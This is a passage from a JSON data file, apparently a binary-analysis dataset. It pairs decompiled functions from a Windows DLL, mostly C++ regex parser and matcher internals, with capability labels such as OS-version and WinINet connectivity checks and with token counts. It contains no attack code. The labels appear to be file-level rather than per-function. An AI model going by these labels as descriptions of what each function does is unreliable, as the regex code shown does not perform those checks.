        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.180016a80(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int16_t **noname_0;\n    int16_t *piVar6;\n    ulong unaff_RBX;\n    uint32_t uVar7;\n    ulong unaff_RBP;\n    uint32_t uVar8;\n    ulong unaff_RSI;\n    uint8_t uVar9;\n    ulong unaff_RDI;\n    ulong unaff_R14;\n    ulong in_stack_00000000;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong var_1h;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    \n    iVar5 = *(arg1 + 0x7c);\n    uVar8 = 0xffffffff;\n    uVar7 = 0;\n    if (iVar5 == 0x2a) goto code_r0x000180016ab7;\n    if (iVar5 == 0x2b) {\n        uVar7 = 1;\n        goto code_r0x000180016ab7;\n    }\n    if (iVar5 == 0x3f) {\n        uVar8 = 1;\n        uVar7 = 0;\n        goto code_r0x000180016ab7;\n    }\n    if (iVar5 != 0x7b) {\n        return;\n    }\n    piVar6 = *arg1;\n    if (piVar6 != arg1[2]) {\n        if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n            piVar6 = piVar1;\n        }\n        *arg1 = piVar6 + 1;\n    }\n    fcn.180015150(arg1);\n    noname_0 = arg1;\n    cVar4 = fcn.180018220(arg1);\n    if (cVar4 == '\\0') {\n        fcn.180015140(noname_0, 7);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    iVar5 = *(arg1 + 0x7c);\n    uVar7 = *(arg1 + 0x74);\n    uVar2 = uVar7;\n    if (iVar5 == 0x2c) {\n        piVar6 = *arg1;\n        if (piVar6 != arg1[2]) {\n            if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                piVar6 = piVar1;\n            }\n            *arg1 = piVar6 + 1;\n        }\n        noname_0 = arg1;\n        fcn.180015150(arg1);\n        if (*(arg1 + 0x7c) != 0x7d) {\n            noname_0 = arg1;\n            cVar4 = fcn.180018220(arg1);\n            if (cVar4 == '\\0') {\n                fcn.180015140(noname_0, 7);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar5 = *(arg1 + 0x7c);\n            uVar2 = *(arg1 + 0x74);\n            goto code_r0x000180016c98;\n        }\n    }\n    else {\ncode_r0x000180016c98:\n        uVar8 = uVar2;\n        if (iVar5 != 0x7d) goto code_r0x000180016cf5;\n    }\n    if ((uVar8 == 0xffffffff) || (uVar7 <= uVar8)) {\ncode_r0x000180016ab7:\n        *(arg1[9] + 6) = *(arg1[9] + 6) | 4;\n        piVar6 = *arg1;\n        if (piVar6 != arg1[2]) {\n            if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                piVar6 = piVar1;\n            }\n            *arg1 = piVar6 + 1;\n        }\n        fcn.180015150(arg1);\n        uVar2 = *(arg1 + 0x10);\n        if (((uVar2 >> 10 & 1) == 0) || (*(arg1 + 0x7c) != 0x3f)) {\n            uVar9 = 1;\n        }\n        else {\n            piVar6 = *arg1;\n            uVar9 = 0;\n            if (piVar6 != arg1[2]) {\n                if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                   ((((uVar2 & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                    (((uVar2 & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar6 = piVar1;\n                }\n                *arg1 = piVar6 + 1;\n            }\n            fcn.180015150(arg1);\n        }\n        fcn.180018dc0(arg1 + 8, uVar7, uVar8, uVar9, unaff_R14, in_stack_00000000, unaff_RDI, unaff_RBX, unaff_RBP, \n                      unaff_RSI, in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                      stack0x00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                      in_stack_00000070);\n        return;\n    }\ncode_r0x000180016cf5:\n    fcn.180015140(noname_0, 7);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 1701
    },
    "180017ba": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180017ba0(int64_t **arg1)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    uchar auStack88 [32];\n    uchar auStack56 [2];\n    uchar auStack54 [6];\n    int64_t aiStack48 [3];\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack88;\n    (**(**arg1 + 0x20))(*arg1, aiStack48, auStack56, auStack54);\n    if (7 < uStack24) {\n        arg1_00 = aiStack48[0];\n        if (0xfff < uStack24 * 2 + 2) {\n            arg1_00 = *(aiStack48[0] + -8);\n            if (0x1f < (aiStack48[0] - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uStack24 * 2 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 294
    },
    "18001822": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180018220(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    *(arg1 + 0x74) = 0;\n    iVar6 = 0x7fffffff;\n    do {\n        uVar2 = *(arg1 + 0xf) - 0x30;\n        uVar3 = uVar2;\n        if ((9 < uVar2) || (iVar5 = *(arg1 + 0xf) - 0x30,  iVar5 == -1)) break;\n        iVar6 = iVar6 + -1;\n        piVar4 = *arg1;\n        *(arg1 + 0x74) = iVar5 + *(arg1 + 0x74) * 10;\n        if (piVar4 != arg1[2]) {\n            if (((*piVar4 == 0x5c) && (piVar1 = piVar4 + 1,  piVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                piVar4 = piVar1;\n            }\n            *arg1 = piVar4 + 1;\n        }\n        uVar3 = fcn.180015150(arg1);\n    } while (iVar6 != 0);\n    return uVar3 & 0xffffffffffffff00 | iVar6 != 0x7fffffff;\n}\n",
        "token_count": 405
    },
    "1800182e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.1800182e0(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    char in_DL;\n    \n    piVar3 = *arg1;\n    if (piVar3 != arg1[2]) {\n        iVar2 = fcn.18001b1c0(arg1[0xd], piVar3, piVar3 + 1);\n        if (iVar2 != 0) {\n            if (in_DL != '\\0') {\n                fcn.180018d20(arg1 + 8);\n            }\n            (**(**(arg1[0xd] + 4) + 0x20))(*(arg1[0xd] + 4), 1);\n            fcn.18001a790(arg1 + 8);\n            piVar3 = *arg1;\n            if (piVar3 != arg1[2]) {\n                if (((*piVar3 == 0x5c) && (piVar1 = piVar3 + 1,  piVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar3 = piVar1;\n                }\n                *arg1 = piVar3 + 1;\n            }\n            fcn.180015150(arg1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 373
    },
    "180018dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.180018dc0(int64_t *arg1, ulong arg2, ulong arg3, ulong noname_3, ulong noname_4, ulong noname_5, ulong noname_6\n                  , ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, ulong noname_12, \n                  ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, ulong noname_18, \n                  ulong arg_38h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar (*pauVar3) [16];\n    uchar (*pauVar4) [16];\n    uchar (*pauVar5) [16];\n    uchar (*pauVar6) [16];\n    uchar (*pauVar7) [16];\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_30h;\n    \n    iVar9 = arg1[1];\n    if ((*(iVar9 + 8) == 6) && (*(iVar9 + 0x24) != 1)) {\n        *(iVar9 + 0x24) = *(iVar9 + 0x24) + -1;\n        fcn.180016d00(arg1);\n        iVar9 = arg1[1];\n    }\n    if ((*(iVar9 + 8) == 9) || (*(iVar9 + 8) == 0xe)) {\n        iVar9 = *(iVar9 + 0x20);\n    }\n    if ((arg2 == 0) && (arg3 == 1)) {\n        pauVar3 = fcn.18008fb2c(0x20);\n        *pauVar3 = ZEXT816(0);\n        pauVar3[1] = ZEXT816(0);\n        *(*pauVar3 + 8) = 0x11;\n        *pauVar3[1] = 0;\n        *(pauVar3[1] + 8) = 0;\n        **pauVar3 = vtable.std::_Node_endif.0;\n        pauVar4 = fcn.18008fb2c(0x30);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        pauVar4[2] = ZEXT816(0);\n        *(*pauVar4 + 8) = 0x10;\n        *pauVar4[1] = 0;\n        *(pauVar4[1] + 8) = 0;\n        **pauVar4 = vtable.std::_Node_if.0;\n        *pauVar4[2] = pauVar3;\n        *(pauVar4[2] + 8) = 0;\n        pauVar5 = fcn.18008fb2c(0x30);\n        *pauVar5 = ZEXT816(0);\n        pauVar5[1] = ZEXT816(0);\n        pauVar5[2] = ZEXT816(0);\n        *(*pauVar5 + 8) = 0x10;\n        *pauVar5[1] = 0;\n        *(pauVar5[1] + 8) = 0;\n        **pauVar5 = vtable.std::_Node_if.0;\n        *pauVar5[2] = pauVar3;\n        *(pauVar5[2] + 8) = 0;\n        pauVar6 = fcn.18008fb2c(0x20);\n        *pauVar6 = ZEXT816(0);\n        pauVar6[1] = ZEXT816(0);\n        *(*pauVar6 + 8) = 8;\n        **pauVar6 = vtable.std::_Node_base.0;\n        *pauVar6[1] = 0;\n        *(pauVar6[1] + 8) = 0;\n        pauVar7 = fcn.18008fb2c(0x28);\n        *pauVar7 = ZEXT816(0);\n        pauVar7[1] = ZEXT816(0);\n        *(*pauVar7 + 8) = 9;\n        **pauVar7 = vtable.std::_Node_end_group.0;\n        *pauVar7[2] = pauVar6;\n        *pauVar5[1] = pauVar6;\n        *(pauVar6[1] + 8) = pauVar5;\n        *pauVar6[1] = pauVar7;\n        *(pauVar7[1] + 8) = pauVar6;\n        *pauVar7[1] = pauVar3;\n        *(pauVar4[2] + 8) = pauVar5;\n        *(pauVar3[1] + 8) = arg1[1];\n        iVar8 = arg1[1];\n        if (*(iVar8 + 0x10) != 0) {\n            *pauVar3[1] = *(iVar8 + 0x10);\n            *(*(arg1[1] + 0x10) + 0x18) = pauVar3;\n            iVar8 = arg1[1];\n        }\n        *(iVar8 + 0x10) = pauVar3;\n        arg1[1] = pauVar3;\n        *(*(iVar9 + 0x18) + 0x10) = pauVar4;\n        *(pauVar4[1] + 8) = *(iVar9 + 0x18);\n        *(iVar9 + 0x18) = pauVar4;\n        *pauVar4[1] = iVar9;\n        if (noname_3 == 0) {\n            iVar8 = *pauVar5[1];\n            uVar2 = *(iVar9 + 0x18);\n            *(iVar9 + 0x18) = *(iVar8 + 0x18);\n            *(iVar8 + 0x18) = uVar2;\n            uVar2 = *pauVar4[1];\n            *pauVar4[1] = *pauVar5[1];\n            *pauVar5[1] = uVar2;\n        }\n    }\n    else {\n        pauVar3 = fcn.18008fb2c(0x28);\n        *pauVar3 = ZEXT816(0);\n        pauVar3[1] = ZEXT816(0);\n        *(*pauVar3 + 8) = 0x13;\n        *pauVar3[1] = 0;\n        *(pauVar3[1] + 8) = 0;\n        **pauVar3 = vtable.std::_Node_end_rep.0;\n        *pauVar3[2] = 0;\n        pauVar4 = fcn.18008fb2c(0x38);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        pauVar4[2] = ZEXT816(0);\n        *pauVar4[3] = 0;\n        iVar1 = *(*arg1 + 0x24);\n        *(*arg1 + 0x24) = iVar1 + 1;\n        *(*pauVar4 + 0xc) = noname_3 * 2;\n        **pauVar4 = vtable.std::_Node_rep.0;\n        *(*pauVar4 + 8) = 0x12;\n        *pauVar4[1] = 0;\n        *(pauVar4[1] + 8) = 0;\n        *pauVar4[2] = arg2;\n        *(pauVar4[2] + 4) = arg3;\n        *(pauVar4[2] + 8) = pauVar3;\n        *pauVar4[3] = iVar1;\n        *(pauVar4[3] + 4) = 0xffffffff;\n        *pauVar3[2] = pauVar4;\n        *(pauVar3[1] + 8) = arg1[1];\n        iVar8 = arg1[1];\n        if (*(iVar8 + 0x10) != 0) {\n            *pauVar3[1] = *(iVar8 + 0x10);\n            *(*(arg1[1] + 0x10) + 0x18) = pauVar3;\n            iVar8 = arg1[1];\n        }\n        *(iVar8 + 0x10) = pauVar3;\n        arg1[1] = pauVar3;\n        *(*(iVar9 + 0x18) + 0x10) = pauVar4;\n        *(pauVar4[1] + 8) = *(iVar9 + 0x18);\n        *(iVar9 + 0x18) = pauVar4;\n        *pauVar4[1] = iVar9;\n    }\n    return;\n}\n",
        "token_count": 2042
    },
    "18001910": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180019100(int16_t **arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    bool bVar11;\n    uchar auStack184 [32];\n    int16_t *piStack152;\n    uint uStack144;\n    char cStack136;\n    int16_t *piStack128;\n    ulong uStack120;\n    int16_t *piStack112;\n    int64_t iStack104;\n    int64_t iStack96;\n    int64_t iStack88;\n    int16_t *piStack80;\n    uint64_t uStack72;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack184;\n    iVar8 = *(arg1 + 0x1c);\n    if (0 < iVar8) {\n        iVar8 = iVar8 + -1;\n        *(arg1 + 0x1c) = iVar8;\n        if (iVar8 < 1) {\n            fcn.18006dfac(0xc);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    if ((0 < *(arg1 + 0xdc)) && (iVar5 = *(arg1 + 0xdc) + -1,  *(arg1 + 0xdc) = iVar5,  iVar5 < 1)) {\n        fcn.18006dfac(0xb);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    bVar11 = false;\n    if (arg2 != 0) {\n        do {\n            iVar8 = *(arg2 + 8);\n            if (0x14 < iVar8 - 1U) {\n                fcn.18006dfac(0xd);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n    // switch table (21 cases) at 0x180019650\n            switch(iVar8) {\n            case 2:\n                if (((*(arg1 + 0xbc) >> 8 & 1) == 0) && (*arg1 == arg1[0x13])) {\n                    bVar11 = *(arg1 + 0xbc) & 1;\n                }\n                else {\n                    bVar11 = (*arg1)[-1] != 10;\n                }\n                break;\n            case 3:\n                if (*arg1 == arg1[0x14]) {\n                    bVar11 = *(arg1 + 0xbc) >> 1 & 1;\n                }\n                else {\n                    bVar11 = **arg1 != 10;\n                }\n                break;\n            case 4:\n                uVar3 = fcn.18001b120(arg1);\n                bVar11 = uVar3 == (*(arg2 + 0xc) & 1);\n                break;\n            case 5:\n                piVar7 = *arg1;\n                if (((piVar7 == arg1[0x14]) || (*piVar7 == 10)) || (*piVar7 == 0xd)) goto code_r0x0001800195e5;\n                *arg1 = piVar7 + 1;\n                break;\n            case 6:\n                uStack144 = *(arg1 + 0x17);\n                piStack152 = arg1[0x1a];\n                piVar7 = fcn.1800196b0(*arg1, arg1[0x14], *(arg2 + 0x28), *(arg2 + 0x28) + *(arg2 + 0x24) * 2);\n                if (piVar7 == *arg1) goto code_r0x0001800195e5;\n                *arg1 = piVar7;\n                break;\n            case 7:\n                if ((*arg1 != arg1[0x14]) && (cVar4 = fcn.18001ae70(arg1, arg2),  cVar4 != '\\0')) {\n                    bVar11 = false;\n                    goto code_r0x0001800193d2;\n                }\n                goto code_r0x0001800195e5;\n            case 10:\n            case 0xb:\n                piVar7 = *arg1;\n                cStack136 = iVar8 == 0xb;\n                piStack80 = NULL;\n                iStack104 = 0;\n                iStack96 = 0;\n                iVar9 = 0;\n                iStack88 = 0;\n                piStack128 = arg1[1];\n                piStack112 = piVar7;\n                if (piStack128 == arg1[2]) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar10 = arg1[2] - piStack128;\n                    iVar6 = fcn.180015a30(*((iVar8 - 1U) * 4 + 0x180019650) + 0x180000000, iVar10 >> 2);\n                    iVar9 = iVar6 + (iVar10 >> 2) * 4;\n                    iStack104 = iVar6;\n                    iStack88 = iVar9;\n                    fcn.1800ade80(iVar6, piStack128, iVar10);\n                    iStack96 = iVar6 + iVar10;\n                }\n                piStack80 = arg1[4];\n                cVar4 = fcn.180019100(arg1, *(arg2 + 0x20));\n                *arg1 = piVar7;\n                if (cVar4 == cStack136) {\n                    fcn.180019f70(arg1 + 1, &iStack104);\n                    bVar11 = true;\n                    iVar9 = iStack88;\n                    iVar6 = iStack104;\n                }\n                if (iVar6 != 0) {\n                    iVar10 = iVar6;\n                    if ((0xfff < (iVar9 - iVar6 & 0xfffffffffffffffcU)) &&\n                       (iVar10 = *(iVar6 + -8),  0x1f < (iVar6 - iVar10) - 8U)) {\n                        fcn.1800b3528();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    fcn.18008fb24(iVar10);\n                    iStack104 = 0;\n                    iStack96 = 0;\n                    iStack88 = 0;\n                }\n                break;\n            case 0xc:\n                goto code_r0x00018001950e;\n            case 0xd:\n                *(arg1[5] + *(arg2 + 0x20) * 8) = *arg1;\n                piVar7 = arg1[4];\n                if (*(arg2 + 0x20) < piVar7) {\n                    do {\n                        piVar7 = piVar7 + -1;\n                        *(arg1[1] + (piVar7 >> 5) * 2) = *(arg1[1] + (piVar7 >> 5) * 2) & ~(1 << (piVar7 & 0x1f));\n                    } while (*(arg2 + 0x20) < piVar7);\n                }\n                break;\n            case 0xe:\n                iVar9 = *(arg2 + 0x20);\n                if ((*(arg1 + 0xc1) != '\\0') || (*(iVar9 + 0x20) != 0)) {\n                    *(arg1[1] + (*(iVar9 + 0x20) >> 5) * 2) =\n                         *(arg1[1] + (*(iVar9 + 0x20) >> 5) * 2) | 1 << (*(iVar9 + 0x20) & 0x1f);\n                    *(arg1[5] + *(iVar9 + 0x20) * 8 + 4) = *arg1;\n                }\n                break;\n            case 0xf:\n                uVar1 = *(arg2 + 0x20);\n                if ((*(arg1[1] + (uVar1 >> 5) * 2) >> (uVar1 & 0x1f) & 1) != 0) {\n                    piVar7 = *arg1;\n                    iVar9 = *(arg1[5] + uVar1 * 8);\n                    iVar6 = *(arg1[5] + uVar1 * 8 + 4);\n                    if (iVar9 != iVar6) {\n                        uStack144 = *(arg1 + 0x17);\n                        piStack152 = arg1[0x1a];\n                        piVar7 = fcn.1800196b0(piVar7, arg1[0x14], iVar9, iVar6);\n                        if (piVar7 == *arg1) goto code_r0x0001800195e5;\n                    }\n                    *arg1 = piVar7;\n                }\n                break;\n            case 0x10:\n                cVar4 = fcn.18001a930(arg1, arg2);\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\ncode_r0x00018001950e:\n                arg2 = 0;\n                break;\n            case 0x12:\n                cVar4 = fcn.18001ac50(arg1, arg2, \n                                      (*(arg2 + 0xc) >> 1 & 0xff | (*(arg2 + 0xc) >> 9) << 8) & 0xffffffffffffff01, 0);\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\n                arg2 = 0;\n                break;\n            case 0x13:\n                iVar9 = *(arg2 + 0x20);\n                if (*(iVar9 + 0x34) != 0) goto code_r0x00018001950e;\n                cVar4 = fcn.18001ac50(arg1, iVar9, \n                                      (*(iVar9 + 0xc) >> 1 & 0xff | (*(iVar9 + 0xc) >> 9) << 8) & 0xffffffffffffff01, \n                                      *(arg1[0x10] + *(iVar9 + 0x30) * 8));\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\n                arg2 = 0;\n                break;\n            case 0x15:\n                if ((((*(arg1 + 0xbc) & 0x2020) == 0) || (arg1[0x13] != *arg1)) &&\n                   ((*(arg1 + 0x1b) == '\\0' || (*arg1 == arg1[0x14])))) {\n                    if ((*(arg1 + 0x18) == '\\0') || (cVar4 = fcn.18001b070(arg1),  cVar4 != '\\0')) {\n                        fcn.180019e40(arg1 + 8, arg1);\n                        *(arg1 + 0x18) = 1;\n                    }\n                    arg2 = 0;\n                }\n                else {\n                    bVar11 = true;\n                    arg2 = 0;\n                }\n            }\n            if (bVar11 != false) goto code_r0x0001800195e5;\ncode_r0x0001800193d2:\n            if ((arg2 == 0) || (arg2 = *(arg2 + 0x10),  arg2 == 0)) goto code_r0x0001800195e5;\n        } while( true );\n    }\ncode_r0x0001800195eb:\n    if (0 < iVar8) {\n        *(arg1 + 0x1c) = iVar8 + 1;\n    }\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\ncode_r0x0001800195e5:\n    iVar8 = *(arg1 + 0x1c);\n    goto code_r0x0001800195eb;\n}\n",
        "token_count": 2666
    },
    "18001987": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.180019870(ulong noname_0, uint32_t *arg2, ulong arg3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint16_t *puVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    uint32_t uVar9;\n    ushort *puVar11;\n    uint16_t *puVar12;\n    int64_t iVar13;\n    uint16_t *puVar14;\n    uint64_t uVar15;\n    bool bVar16;\n    bool bVar17;\n    ulong var_fh;\n    ulong var_1fh;\n    ulong var_27h;\n    ulong var_2fh;\n    uchar auStack184 [32];\n    int64_t aiStack152 [3];\n    uint64_t uStack128;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    int64_t iStack96;\n    uint64_t uStack88;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar auStack68 [3];\n    int64_t var_39h;\n    uint64_t uStack56;\n    uchar auStack48 [7];\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_1h;\n    uint64_t uVar10;\n    \n    uStack120 = 0xfffffffffffffffe;\n    _auStack48 = *0x180123080 ^ auStack184;\n    stack0xffffffffffffffc0 = 0;\n    uStack56 = 7;\n    uStack80._0_2_ = 0;\n    iStack96 = 0;\n    uStack88 = 7;\n    uStack112._0_2_ = 0;\n    fcn.18000d6f0(&uStack112);\n    puVar8 = &uStack112;\n    if (7 < uStack88) {\n        puVar8 = CONCAT44(uStack108, CONCAT22(uStack112._2_2_, uStack112));\n    }\n    puVar11 = &uStack112;\n    if (7 < uStack88) {\n        puVar11 = CONCAT44(uStack108, CONCAT22(uStack112._2_2_, uStack112));\n    }\n    puVar5 = fcn.18001b310(arg3, aiStack152, puVar11, puVar8 + iStack96);\n    if (&uStack112 == puVar5) {\ncode_r0x000180019980:\n        if (7 < uStack128) {\n            iVar7 = aiStack152[0];\n            if ((0xfff < uStack128 * 2 + 2) && (iVar7 = *(aiStack152[0] + -8),  0x1f < (aiStack152[0] - iVar7) - 8U))\n            goto code_r0x000180019c11;\n            fcn.18008fb24(iVar7);\n        }\n        puVar14 = CONCAT44(uStack108, CONCAT22(uStack112._2_2_, uStack112));\n        uVar15 = uStack88;\n        for (; arg2 != NULL; arg2 = *(arg2 + 6)) {\n            if (arg2[3] != 0) {\n                uVar4 = *arg2;\n                uVar10 = 0;\n                do {\n                    fcn.180010d70(&uStack80, *(arg2 + 4) + uVar10 * 2, uVar4);\n                    puVar8 = &uStack80;\n                    if (7 < uStack56) {\n                        puVar8 = CONCAT44(uStack76, CONCAT22(uStack80._2_2_, uStack80));\n                    }\n                    puVar11 = &uStack80;\n                    if (7 < uStack56) {\n                        puVar11 = CONCAT44(uStack76, CONCAT22(uStack80._2_2_, uStack80));\n                    }\n                    puVar5 = fcn.18001b310(arg3, aiStack152, puVar11, puVar8 + stack0xffffffffffffffc0);\n                    if (&uStack80 != puVar5) {\n                        if (7 < uStack56) {\n                            iVar13 = CONCAT44(uStack76, CONCAT22(uStack80._2_2_, uStack80));\n                            iVar7 = iVar13;\n                            if ((0xfff < uStack56 * 2 + 2) && (iVar7 = *(iVar13 + -8),  0x1f < (iVar13 - iVar7) - 8U))\n                            goto code_r0x000180019c17;\n                            fcn.18008fb24(iVar7);\n                        }\n                        uStack80._0_2_ = *puVar5;\n                        uStack80._2_2_ = *puVar5 >> 0x10;\n                        uStack76 = puVar5[1];\n                        uStack72 = puVar5[2];\n                        _auStack68 = puVar5[3];\n                        stack0xffffffffffffffc0 = *(puVar5 + 4);\n                        uStack56 = *(puVar5 + 6);\n                        *(puVar5 + 4) = 0;\n                        *(puVar5 + 6) = 7;\n                        *puVar5 = 0;\n                    }\n                    if (7 < uStack128) {\n                        iVar7 = aiStack152[0];\n                        if ((0xfff < uStack128 * 2 + 2) &&\n                           (iVar7 = *(aiStack152[0] + -8),  0x1f < (aiStack152[0] - iVar7) - 8U))\n                        goto code_r0x000180019c17;\n                        fcn.18008fb24(iVar7);\n                    }\n                    puVar14 = CONCAT44(uStack108, CONCAT22(uStack112._2_2_, uStack112));\n                    puVar6 = &uStack112;\n                    if (7 < uStack88) {\n                        puVar6 = puVar14;\n                    }\n                    puVar12 = &uStack80;\n                    if (7 < uStack56) {\n                        puVar12 = CONCAT44(uStack76, CONCAT22(uStack80._2_2_, uStack80));\n                    }\n                    uVar15 = uStack88;\n                    if (stack0xffffffffffffffc0 == iStack96) {\n                        if (stack0xffffffffffffffc0 == 0) goto code_r0x000180019b5d;\n                        uVar1 = *puVar12;\n                        uVar2 = *puVar6;\n                        if (uVar2 <= uVar1) {\n                            iVar13 = puVar12 - puVar6;\n                            bVar16 = uVar1 < uVar2;\n                            bVar17 = uVar1 == uVar2;\n                            iVar7 = stack0xffffffffffffffc0;\n                            do {\n                                if (!bVar16 && !bVar17) break;\n                                if (iVar7 == 1) goto code_r0x000180019b5d;\n                                iVar7 = iVar7 + -1;\n                                puVar6 = puVar6 + 1;\n                                uVar1 = *(puVar6 + iVar13);\n                                bVar16 = uVar1 < *puVar6;\n                                bVar17 = uVar1 == *puVar6;\n                            } while (!bVar16);\n                        }\n                    }\n                    uVar4 = *arg2;\n                    uVar9 = uVar10 + uVar4;\n                    uVar10 = uVar9;\n                } while (uVar9 < arg2[3]);\n            }\n        }\ncode_r0x000180019b5d:\n        if (7 < uVar15) {\n            puVar6 = puVar14;\n            if ((0xfff < uVar15 * 2 + 2) && (puVar6 = *(puVar14 + 0xfffffffffffffffc),  0x1f < puVar14 + (-8 - puVar6)))\n            goto code_r0x000180019c1d;\n            fcn.18008fb24(puVar6);\n        }\n        iStack96 = 0;\n        uStack88 = 7;\n       